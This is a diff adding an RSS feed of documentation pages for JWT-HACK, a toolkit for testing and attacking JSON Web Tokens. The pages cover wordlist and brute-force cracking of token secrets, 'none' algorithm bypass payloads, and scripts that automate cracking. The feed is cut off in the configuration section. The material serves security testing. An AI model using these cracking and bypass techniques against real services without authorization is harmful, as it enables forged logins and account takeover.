@@ -1,0 +1,1684 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>JWT-HACK</title>
+    <link>http://localhost:3000</link>
+    <description>A high-performance toolkit for testing, analyzing and attacking JSON Web Tokens</description>
+    <atom:link href="http://localhost:3000/rss.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Performance Optimization</title>
+      <link>http://localhost:3000/advanced/performance-optimization/</link>
+      <guid>http://localhost:3000/advanced/performance-optimization/</guid>
+      <description>&lt;p&gt;JWT-HACK is built for high performance, but you can optimize it further for your specific use cases.&lt;/p&gt;
+&lt;h2 id=&quot;cracking-performance&quot;&gt;Cracking Performance&lt;/h2&gt;
+&lt;h3 id=&quot;thread-configuration&quot;&gt;Thread Configuration&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Use all available CPU cores
+jwt-hack crack -w wordlist.txt &amp;lt;TOKEN&amp;gt; --power
+
+# Set specific thread count
+jwt-hack crack -w wordlist.txt &amp;lt;TOKEN&amp;gt; -c 16
+
+# Balance between performance and resource usage
+jwt-hack crack -w wordlist.txt &amp;lt;TOKEN&amp;gt; -c $(nproc)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;memory-optimization&quot;&gt;Memory Optimization&lt;/h3&gt;
+&lt;p&gt;For large wordlists:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Use SSD storage for faster I/O&lt;/li&gt;
+&lt;li&gt;Ensure adequate RAM (4GB+ recommended for large operations)&lt;/li&gt;
+&lt;li&gt;Monitor memory usage with system tools&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;wordlist-optimization&quot;&gt;Wordlist Optimization&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Sort by frequency for faster results
+sort -u wordlist.txt &amp;gt; sorted_wordlist.txt
+
+# Remove duplicates to reduce processing time
+awk &apos;!seen[$0]++&apos; wordlist.txt &amp;gt; unique_wordlist.txt
+
+# Split large wordlists for parallel processing
+split -l 100000 large_wordlist.txt chunk_
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;build-optimizations&quot;&gt;Build Optimizations&lt;/h2&gt;
+&lt;h3 id=&quot;release-builds&quot;&gt;Release Builds&lt;/h3&gt;
+&lt;p&gt;Always use release builds for production:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Standard release build
+cargo build --release
+
+# Maximum optimization
+RUSTFLAGS=&amp;quot;-C target-cpu=native&amp;quot; cargo build --release
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;profile-guided-optimization&quot;&gt;Profile-Guided Optimization&lt;/h3&gt;
+&lt;p&gt;For maximum performance:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Build with PGO
+RUSTFLAGS=&amp;quot;-C profile-generate&amp;quot; cargo build --release
+./target/release/jwt-hack crack -w sample.txt &amp;lt;TOKEN&amp;gt;
+RUSTFLAGS=&amp;quot;-C profile-use&amp;quot; cargo build --release
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;system-tuning&quot;&gt;System Tuning&lt;/h2&gt;
+&lt;h3 id=&quot;linux&quot;&gt;Linux&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Increase file descriptor limits
+ulimit -n 65536
+
+# Optimize CPU scaling
+echo performance | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;macos&quot;&gt;macOS&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Increase file descriptor limits
+launchctl limit maxfiles 65536 200000
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;benchmarking&quot;&gt;Benchmarking&lt;/h2&gt;
+&lt;p&gt;Compare performance with different settings:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Benchmark dictionary attack
+time jwt-hack crack -w wordlist.txt &amp;lt;TOKEN&amp;gt; -c 8
+time jwt-hack crack -w wordlist.txt &amp;lt;TOKEN&amp;gt; --power
+
+# Benchmark brute force
+time jwt-hack crack -m brute &amp;lt;TOKEN&amp;gt; --max=4 -c 8
+time jwt-hack crack -m brute &amp;lt;TOKEN&amp;gt; --max=4 --power
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    <item>
+      <title>Scripting &amp; Automation</title>
+      <link>http://localhost:3000/advanced/scripting-automation/</link>
+      <guid>http://localhost:3000/advanced/scripting-automation/</guid>
+      <description>&lt;p&gt;JWT-HACK is designed to work well in scripts and automated workflows.&lt;/p&gt;
+&lt;h2 id=&quot;exit-codes&quot;&gt;Exit Codes&lt;/h2&gt;
+&lt;p&gt;JWT-HACK uses standard exit codes for automation:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;0&lt;/strong&gt; - Success&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;1&lt;/strong&gt; - General error&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;2&lt;/strong&gt; - Invalid input/arguments&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;3&lt;/strong&gt; - Authentication/verification failure&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;bash-scripting&quot;&gt;Bash Scripting&lt;/h2&gt;
+&lt;h3 id=&quot;basic-token-validation&quot;&gt;Basic Token Validation&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;#!/bin/bash
+
+validate_token() {
+    local token=&amp;quot;$1&amp;quot;
+    local secret=&amp;quot;$2&amp;quot;
+
+    if jwt-hack verify &amp;quot;$token&amp;quot; --secret=&amp;quot;$secret&amp;quot; &amp;gt; /dev/null 2&amp;gt;&amp;amp;1; then
+        echo &amp;quot;Token is valid&amp;quot;
+        return 0
+    else
+        echo &amp;quot;Token is invalid&amp;quot;
+        return 1
+    fi
+}
+
+# Usage
+if validate_token &amp;quot;$JWT_TOKEN&amp;quot; &amp;quot;$SECRET&amp;quot;; then
+    echo &amp;quot;Proceeding with authenticated request&amp;quot;
+else
+    echo &amp;quot;Authentication failed&amp;quot;
+    exit 1
+fi
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;batch-token-processing&quot;&gt;Batch Token Processing&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;#!/bin/bash
+
+# Process multiple tokens from file
+while IFS= read -r token; do
+    echo &amp;quot;Processing token: ${token:0:20}...&amp;quot;
+
+    if jwt-hack decode &amp;quot;$token&amp;quot; &amp;gt; /dev/null 2&amp;gt;&amp;amp;1; then
+        echo &amp;quot;✓ Valid format&amp;quot;
+        jwt-hack decode &amp;quot;$token&amp;quot; | grep -E &amp;quot;(exp|iat)&amp;quot;
+    else
+        echo &amp;quot;✗ Invalid format&amp;quot;
+    fi
+    echo &amp;quot;---&amp;quot;
+done &amp;lt; tokens.txt
+&lt;/code&gt;&lt;/pre&gt; id=&quot;automated-cracking&quot;&gt;Automated Cracking&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;#!/bin/bash
+
+crack_token() {
+    local token=&amp;quot;$1&amp;quot;
+    local wordlist=&amp;quot;$2&amp;quot;
+
+    echo &amp;quot;Attempting to crack token...&amp;quot;
+
+    if result=$(jwt-hack crack -w &amp;quot;$wordlist&amp;quot; &amp;quot;$token&amp;quot; 2&amp;gt;&amp;amp;1); then
+        echo &amp;quot;SUCCESS: Secret found!&amp;quot;
+        echo &amp;quot;$result&amp;quot; | grep &amp;quot;Secret:&amp;quot;
+        return 0
+    else
+        echo &amp;quot;FAILED: Could not crack token&amp;quot;
+        return 1
+    fi
+}
+
+# Try multiple wordlists
+wordlists=(&amp;quot;/usr/share/wordlists/rockyou.txt&amp;quot; &amp;quot;custom.txt&amp;quot; &amp;quot;common.txt&amp;quot;)
+
+for wordlist in &amp;quot;${wordlists[@]}&amp;quot;; do
+    if [[ -f &amp;quot;$wordlist&amp;quot; ]]; then
+        echo &amp;quot;Trying wordlist: $wordlist&amp;quot;
+        if crack_token &amp;quot;$JWT_TOKEN&amp;quot; &amp;quot;$wordlist&amp;quot;; then
+            break
+        fi
+    fi
+done
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;python-integration&quot;&gt;Python Integration&lt;/h2&gt;
+&lt;h3 id=&quot;using-subprocess&quot;&gt;Using subprocess&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-python hljs&quot;&gt;import subprocess
+import json
+import sys
+
+def decode_jwt(token):
+    &amp;quot;&amp;quot;&amp;quot;Decode JWT token using jwt-hack&amp;quot;&amp;quot;&amp;quot;
+    try:
+        result = subprocess.run(
+            [&apos;jwt-hack&apos;, &apos;decode&apos;, token],
+            capture_output=True,
+            text=True,
+            check=True
+        )
+        return result.stdout
+    except subprocess.CalledProcessError:
+        return None
+
+def verify_jwt(token, secret):
+    &amp;quot;&amp;quot;&amp;quot;Verify JWT token&amp;quot;&amp;quot;&amp;quot;
+    try:
+        subprocess.run(
+            [&apos;jwt-hack&apos;, &apos;verify&apos;, token, &apos;--secret&apos;, secret],
+            capture_output=True,
+            check=True
+        )
+        return True
+    except subprocess.CalledProcessError:
+        return False
+
+# Usage
+token = &amp;quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...&amp;quot;
+if decode_result := decode_jwt(token):
+    print(&amp;quot;Token decoded successfully&amp;quot;)
+    print(decode_result)
+else:
+    print(&amp;quot;Failed to decode token&amp;quot;)
+    sys.exit(1)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;token-analysis-pipeline&quot;&gt;Token Analysis Pipeline&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-python hljs&quot;&gt;#!/usr/bin/env python3
+
+import subprocess
+import json
+import re
+from pathlib import Path
+
+class JWTAnalyzer:
+    def __init__(self):
+        self.jwt_hack = &amp;quot;jwt-hack&amp;quot;
+
+    def decode(self, token):
+        &amp;quot;&amp;quot;&amp;quot;Decode JWT and extract information&amp;quot;&amp;quot;&amp;quot;
+        try:
+            result = subprocess.run(
+                [self.jwt_hack, &apos;decode&apos;, token],
+                capture_output=True,
+                text=True,
+                check=True
+            )
+            return self._parse_decode_output(result.stdout)
+        except subprocess.CalledProcessError:
+            return None
+
+    def verify(self, token, secret):
+        &amp;quot;&amp;quot;&amp;quot;Verify JWT signature&amp;quot;&amp;quot;&amp;quot;
+        try:
+            subprocess.run(
+                [self.jwt_hack, &apos;verify&apos;, token, &apos;--secret&apos;, secret],
+                capture_output=True,
+                check=True
+            )
+            return True
+        except subprocess.CalledProcessError:
+            return False
+
+    def crack(self, token, wordlist):
+        &amp;quot;&amp;quot;&amp;quot;Attempt to crack JWT secret&amp;quot;&amp;quot;&amp;quot;
+        try:
+            result = subprocess.run(
+                [self.jwt_hack, &apos;crack&apos;, &apos;-w&apos;, wordlist, token],
+                capture_output=True,
+                text=True,
+                check=True
+            )
+            # Extract secret from output
+            if match := re.search(r&apos;Secret: (.+)&apos;, result.stdout):
+                return match.group(1)
+        except subprocess.CalledProcessError:
+            pass
+        return None
+
+    def generate_payloads(self, token, target=&apos;all&apos;):
+        &amp;quot;&amp;quot;&amp;quot;Generate attack payloads&amp;quot;&amp;quot;&amp;quot;
+        try:
+            result = subprocess.run(
+                [self.jwt_hack, &apos;payload&apos;, token, &apos;--target&apos;, target],
+                capture_output=True,
+                text=True,
+                check=True
+            )
+            return result.stdout
+        except subprocess.CalledProcessError:
+            return None
+
+    def _parse_decode_output(self, output):
+        &amp;quot;&amp;quot;&amp;quot;Parse decode output to extract structured data&amp;quot;&amp;quot;&amp;quot;
+        # This would parse the actual output format
+        # Implementation depends on jwt-hack output format
+        return {&amp;quot;raw_output&amp;quot;: output}
+
+# Usage example
+analyzer = JWTAnalyzer()
+token = &amp;quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...&amp;quot;
+
+# Analyze token
+info = analyzer.decode(token)
+if info:
+    print(&amp;quot;Token analysis:&amp;quot;, info)
+
+    # Try to crack it
+    secret = analyzer.crack(token, &amp;quot;wordlist.txt&amp;quot;)
+    if secret:
+        print(f&amp;quot;Secret found: {secret}&amp;quot;)
+
+        # Verify with found secret
+        if analyzer.verify(token, secret):
+            print(&amp;quot;Secret verified!&amp;quot;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;cicd-integration&quot;&gt;CI/CD Integration&lt;/h2&gt;
+&lt;h3 id=&quot;github-actions&quot;&gt;GitHub Actions&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-yaml hljs&quot;&gt;name: JWT Security Check
+
+on: [push, pull_request]
+
+jobs:
+  jwt-security:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v2
+
+    - name: Install JWT-HACK
+      run: |
+        cargo install jwt-hack
+
+    - name: Analyze JWT tokens in code
+      run: |
+        # Find JWT tokens in code (simple regex)
+        grep -r &amp;quot;eyJ[A-Za-z0-9_-]*\.&amp;quot; . || true
+
+    - name: Test JWT security
+      run: |
+        # Test any hardcoded tokens
+        if [ -f &amp;quot;test-tokens.txt&amp;quot; ]; then
+          while read token; do
+            echo &amp;quot;Testing token: $token&amp;quot;
+            jwt-hack decode &amp;quot;$token&amp;quot;
+            jwt-hack crack -w common-passwords.txt &amp;quot;$token&amp;quot; || true
+          done &amp;lt; test-tokens.txt
+        fi
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;docker-integration&quot;&gt;Docker Integration&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-dockerfile hljs&quot;&gt;FROM rust:1.75 as builder
+RUN cargo install jwt-hack
+
+FROM debian:bookworm-slim
+COPY --from=builder /usr/local/cargo/bin/jwt-hack /usr/local/bin/
+COPY scripts/ /scripts/
+ENTRYPOINT [&amp;quot;/scripts/analyze.sh&amp;quot;]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;configuration-management&quot;&gt;Configuration Management&lt;/h2&gt;
+&lt;h3 id=&quot;environment-based-configuration&quot;&gt;Environment-Based Configuration&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;#!/bin/bash
+
+# Set defaults from environment
+JWT_HACK_SECRET=&amp;quot;${JWT_HACK_SECRET:-default-secret}&amp;quot;
+JWT_HACK_WORDLIST=&amp;quot;${JWT_HACK_WORDLIST:-/usr/share/wordlists/rockyou.txt}&amp;quot;
+JWT_HACK_CONCURRENCY=&amp;quot;${JWT_HACK_CONCURRENCY:-$(nproc)}&amp;quot;
+
+# Use in scripts
+jwt-hack verify &amp;quot;$token&amp;quot; --secret=&amp;quot;$JWT_HACK_SECRET&amp;quot;
+jwt-hack crack -w &amp;quot;$JWT_HACK_WORDLIST&amp;quot; -c &amp;quot;$JWT_HACK_CONCURRENCY&amp;quot; &amp;quot;$token&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;config-file-generation&quot;&gt;Config File Generation&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;#!/bin/bash
+
+# Generate jwt-hack config
+mkdir -p ~/.config/jwt-hack
+
+cat &amp;gt; ~/.config/jwt-hack/config.toml &amp;lt;&amp;lt; EOF
+default_secret = &amp;quot;${DEFAULT_SECRET}&amp;quot;
+default_algorithm = &amp;quot;${DEFAULT_ALGORITHM:-HS256}&amp;quot;
+default_wordlist = &amp;quot;${DEFAULT_WORDLIST}&amp;quot;
+default_private_key = &amp;quot;${DEFAULT_PRIVATE_KEY}&amp;quot;
+EOF
+
+echo &amp;quot;Configuration generated at ~/.config/jwt-hack/config.toml&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    <item>
+      <title>Examples</title>
+      <link>http://localhost:3000/usage/examples/</link>
+      <guid>http://localhost:3000/usage/examples/</guid>
+      <description>&lt;p&gt;Practical examples for common JWT-HACK use cases and workflows.&lt;/p&gt;
+&lt;h2 id=&quot;basic-operations&quot;&gt;Basic Operations&lt;/h2&gt;
+&lt;h3 id=&quot;decode-a-jwt-token&quot;&gt;Decode a JWT Token&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Decode and display token contents
+jwt-hack decode eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.5mhBHqs5_DTLdINd9p5m7ZJ6XD0Xc55kIaCRY5r6HRA
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;create-a-new-jwt&quot;&gt;Create a New JWT&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Create with HMAC-SHA256
+jwt-hack encode &apos;{&amp;quot;sub&amp;quot;:&amp;quot;1234&amp;quot;, &amp;quot;name&amp;quot;:&amp;quot;John Doe&amp;quot;, &amp;quot;admin&amp;quot;:true}&apos; --secret=mysecret
+
+# Create with RSA
+jwt-hack encode &apos;{&amp;quot;sub&amp;quot;:&amp;quot;1234&amp;quot;, &amp;quot;role&amp;quot;:&amp;quot;admin&amp;quot;}&apos; --private-key=private.pem --algorithm=RS256
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;verify-jwt-signature&quot;&gt;Verify JWT Signature&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Verify HMAC token
+jwt-hack verify eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0In0.SIG --secret=mysecret
+
+# Verify RSA token with expiration
+jwt-hack verify &amp;lt;RSA_TOKEN&amp;gt; --private-key=public.pem --validate-exp
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;security-testing-workflows&quot;&gt;Security Testing Workflows&lt;/h2&gt;
+&lt;h3 id=&quot;full-token-analysis&quot;&gt;Full Token Analysis&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Step 1: Decode to understand structure
+jwt-hack decode &amp;lt;TOKEN&amp;gt;
+
+# Step 2: Try cracking the secret
+jwt-hack crack -w wordlist.txt &amp;lt;TOKEN&amp;gt;
+
+# Step 3: Generate attack payloads
+jwt-hack payload &amp;lt;TOKEN&amp;gt; --target=all
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;password-cracking&quot;&gt;Password Cracking&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Quick dictionary attack with common passwords
+jwt-hack crack -w /usr/share/wordlists/rockyou.txt &amp;lt;TOKEN&amp;gt;
+
+# Brute force attack (short secrets)
+jwt-hack crack -m brute &amp;lt;TOKEN&amp;gt; --max=4 --power
+
+# Custom wordlist with verbose output
+jwt-hack crack -w custom-secrets.txt &amp;lt;TOKEN&amp;gt; --verbose
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;none-algorithm-bypass&quot;&gt;None Algorithm Bypass&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Generate none algorithm payloads
+jwt-hack payload &amp;lt;TOKEN&amp;gt; --target=none
+
+# Test each variant manually
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;advanced-use-cases&quot;&gt;Advanced Use Cases&lt;/h2&gt;
+&lt;h3 id=&quot;compressed-tokens&quot;&gt;Compressed Tokens&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Create compressed JWT
+jwt-hack encode &apos;{&amp;quot;data&amp;quot;:&amp;quot;very long payload content...&amp;quot;}&apos; --secret=test --compress
+
+# Decode automatically handles decompression
+jwt-hack decode &amp;lt;COMPRESSED_TOKEN&amp;gt;
+
+# Crack compressed token
+jwt-hack crack -w wordlist.txt &amp;lt;COMPRESSED_TOKEN&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;custom-headers&quot;&gt;Custom Headers&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Add custom header fields
+jwt-hack encode &apos;{&amp;quot;sub&amp;quot;:&amp;quot;1234&amp;quot;}&apos; \
+  --secret=test \
+  --header=&apos;{&amp;quot;kid&amp;quot;:&amp;quot;key-123&amp;quot;,&amp;quot;x5u&amp;quot;:&amp;quot;https://example.com/certs&amp;quot;}&apos;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;multiple-algorithms&quot;&gt;Multiple Algorithms&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# HS256 (HMAC SHA-256)
+jwt-hack encode &apos;{&amp;quot;sub&amp;quot;:&amp;quot;1234&amp;quot;}&apos; --secret=secret --algorithm=HS256
+
+# HS512 (HMAC SHA-512)
+jwt-hack encode &apos;{&amp;quot;sub&amp;quot;:&amp;quot;1234&amp;quot;}&apos; --secret=secret --algorithm=HS512
+
+# RS256 (RSA SHA-256)
+jwt-hack encode &apos;{&amp;quot;sub&amp;quot;:&amp;quot;1234&amp;quot;}&apos; --private-key=rsa.pem --algorithm=RS256
+
+# ES256 (ECDSA SHA-256)
+jwt-hack encode &apos;{&amp;quot;sub&amp;quot;:&amp;quot;1234&amp;quot;}&apos; --private-key=ec.pem --algorithm=ES256
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;integration-with-other-tools&quot;&gt;Integration with Other Tools&lt;/h2&gt;
+&lt;h3 id=&quot;with-curl&quot;&gt;With curl&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Create token and use in API request
+TOKEN=$(jwt-hack encode &apos;{&amp;quot;sub&amp;quot;:&amp;quot;user123&amp;quot;}&apos; --secret=mysecret)
+curl -H &amp;quot;Authorization: Bearer $TOKEN&amp;quot; https://api.example.com/data
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;with-jq&quot;&gt;With jq&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Extract specific claims from decoded token
+jwt-hack decode &amp;lt;TOKEN&amp;gt; --json | jq &apos;.payload.sub&apos;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;performance-optimization&quot;&gt;Performance Optimization&lt;/h2&gt;
+&lt;h3 id=&quot;parallel-cracking&quot;&gt;Parallel Cracking&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Use all CPU cores
+jwt-hack crack -m brute &amp;lt;TOKEN&amp;gt; --max=5 --power
+
+# Custom concurrency
+jwt-hack crack -w huge-wordlist.txt &amp;lt;TOKEN&amp;gt; -c 16
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;best-practices&quot;&gt;Best Practices&lt;/h2&gt;
+&lt;h3 id=&quot;always-decode-first&quot;&gt;Always Decode First&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Before any attack, understand the token
+jwt-hack decode &amp;lt;TOKEN&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;use-targeted-wordlists&quot;&gt;Use Targeted Wordlists&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Start with small, targeted wordlists
+jwt-hack crack -w top-100.txt &amp;lt;TOKEN&amp;gt;
+
+# Then try larger sets if needed
+jwt-hack crack -w rockyou.txt &amp;lt;TOKEN&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;responsible-testing&quot;&gt;Responsible Testing&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Only test systems you own or have permission to test&lt;/li&gt;
+&lt;li&gt;Always get written authorization&lt;/li&gt;
+&lt;li&gt;Follow responsible disclosure practices&lt;/li&gt;
+&lt;li&gt;Document all testing activities&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    <item>
+      <title>Configuration</title>
+      <link>http://localhost:3000/usage/configuration/</link>
+      <guid>http://localhost:3000/usage/configuration/</guid>
+      <description>&lt;p&gt;JWT-HACK supports configuration through configuration files, environment variables, and command-line options.&lt;/p&gt;
+&lt;h2 id=&quot;configuration-file&quot;&gt;Configuration File&lt;/h2&gt;
+&lt;p&gt;JWT-HACK uses TOML format for configuration files. The default configuration file location follows XDG Base Directory specification:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Linux/macOS&lt;/strong&gt;: &lt;code&gt;~/.config/jwt-hack/config.toml&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Windows&lt;/strong&gt;: &lt;code&gt;%APPDATA%\jwt-hack\config.toml&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;configuration-file-format&quot;&gt;Configuration File Format&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-toml hljs&quot;&gt;# Default secret key for HMAC algorithms
+default_secret = &amp;quot;my-default-secret&amp;quot;
+
+# Default algorithm to use when encoding
+default_algorithm = &amp;quot;HS256&amp;quot;
+
+# Default wordlist path for cracking
+default_wordlist = &amp;quot;/usr/share/wordlists/rockyou.txt&amp;quot;
+
+# Default private key path
+default_private_key = &amp;quot;~/.ssh/jwt-private.pem&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;custom-configuration-file&quot;&gt;Custom Configuration File&lt;/h3&gt;
+&lt;p&gt;Specify a custom configuration file path:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;jwt-hack --config /path/to/custom/config.toml decode &amp;lt;TOKEN&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;configuration-options&quot;&gt;Configuration Options&lt;/h2&gt;
+&lt;h3 id=&quot;default-secret&quot;&gt;Default Secret&lt;/h3&gt;
+&lt;p&gt;Set a default secret for HMAC operations:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-toml hljs&quot;&gt;default_secret = &amp;quot;your-default-secret-here&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Usage:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Uses default secret from config
+jwt-hack encode &apos;{&amp;quot;sub&amp;quot;:&amp;quot;1234&amp;quot;}&apos;
+
+# Override with command line
+jwt-hack encode &apos;{&amp;quot;sub&amp;quot;:&amp;quot;1234&amp;quot;}&apos; --secret=different-secret
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;default-algorithm&quot;&gt;Default Algorithm&lt;/h3&gt;
+&lt;p&gt;Configure the default signing algorithm:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-toml hljs&quot;&gt;default_algorithm = &amp;quot;HS512&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Supported algorithms:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;HS256&lt;/code&gt;, &lt;code&gt;HS384&lt;/code&gt;, &lt;code&gt;HS512&lt;/code&gt; (HMAC)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;RS256&lt;/code&gt;, &lt;code&gt;RS384&lt;/code&gt;, &lt;code&gt;RS512&lt;/code&gt; (RSA)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ES256&lt;/code&gt;, &lt;code&gt;ES384&lt;/code&gt; (ECDSA)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;default-wordlist&quot;&gt;Default Wordlist&lt;/h3&gt;
+&lt;p&gt;Set default wordlist for cracking operations:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-toml hljs&quot;&gt;default_wordlist = &amp;quot;/opt/wordlists/jwt-secrets.txt&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Usage:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Uses default wordlist
+jwt-hack crack &amp;lt;TOKEN&amp;gt;
+
+# Override with specific wordlist
+jwt-hack crack -w /path/to/other/wordlist.txt &amp;lt;TOKEN&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;default-private-key&quot;&gt;Default Private Key&lt;/h3&gt;
+&lt;p&gt;Configure default private key path:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-toml hljs&quot;&gt;default_private_key = &amp;quot;/path/to/default/key.pem&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;environment-variables&quot;&gt;Environment Variables&lt;/h2&gt;
+&lt;p&gt;Override configuration with environment variables:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Default secret
+export JWT_HACK_DEFAULT_SECRET=&amp;quot;env-secret&amp;quot;
+
+# Default algorithm
+export JWT_HACK_DEFAULT_ALGORITHM=&amp;quot;RS256&amp;quot;
+
+# Default wordlist
